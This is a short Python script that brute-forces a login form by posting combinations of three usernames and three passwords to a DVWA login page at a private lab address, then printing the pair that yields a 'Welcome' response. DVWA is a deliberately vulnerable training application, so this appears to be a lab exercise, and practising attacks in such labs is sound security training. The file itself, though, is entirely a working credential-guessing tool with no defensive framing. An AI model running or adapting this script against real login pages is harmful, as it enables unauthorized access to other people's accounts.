import requests


USERNAMES = ['admin2', 'admin', 'admin88']
PASSWORDS = ['password2', 'password', 'password88']
URL = 'http://192.168.56.132/dvwa/login.php'

for user in USERNAMES:
    for password in PASSWORDS:
        DATA = {
            'username': user,
            'password': password,
            'Login': 'Login',
        }
        res = requests.post(url=URL, data=DATA)
        if 'Welcome' in res.text:
            print(f'logged in with user: {user}, password: {password}')
            break
        else:
            print(f'trying user: {user}, password: {password}')
    # break
